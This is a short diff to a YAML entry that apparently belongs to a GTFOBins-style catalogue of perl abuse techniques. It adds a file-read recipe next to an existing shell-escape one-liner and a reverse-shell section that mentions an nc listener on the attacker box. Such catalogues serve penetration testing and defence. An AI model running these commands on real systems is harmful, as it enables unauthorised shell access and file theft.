@@ -2,6 +2,10 @@
 functions:
   shell:
     - code: perl -e 'exec "/bin/sh";'
+  file-read:
+    - code: |
+        LFILE=file_to_read
+        perl -ne print $LFILE
   reverse-shell:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
